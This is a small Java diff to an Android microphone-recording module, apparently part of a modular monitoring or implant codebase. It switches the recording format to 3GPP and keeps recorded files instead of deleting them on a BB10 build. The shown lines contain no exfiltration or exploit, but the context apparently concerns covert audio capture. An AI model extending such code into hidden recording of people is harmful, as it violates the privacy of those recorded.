@@ -119,7 +119,7 @@ public class ModuleMicL extends ModuleMic {
 			}
 		}
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
+		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 		recorder.setOnErrorListener(this);
 		recorder.setOnInfoListener(this);
 		recorder.setMaxFileSize(MAX_FILE_SIZE);
@@ -170,7 +170,10 @@ public class ModuleMicL extends ModuleMic {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteSockets) delete file: " + out_file.getFile());//$NON-NLS-1$
 			}
-			out_file.delete();
+
+			if(!Cfg.BB10) {
+				out_file.delete();
+			}
 		}
 		out_file = null;
 	}
